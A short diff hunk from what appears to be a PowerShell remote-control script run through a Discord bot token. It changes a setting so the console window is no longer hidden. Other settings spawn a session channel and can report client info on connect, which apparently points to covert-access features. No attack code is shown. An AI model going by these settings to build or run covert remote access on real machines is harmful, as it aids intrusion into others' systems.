@@ -20,7 +20,7 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideConsole = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 0 # Generate client info message on session start
 
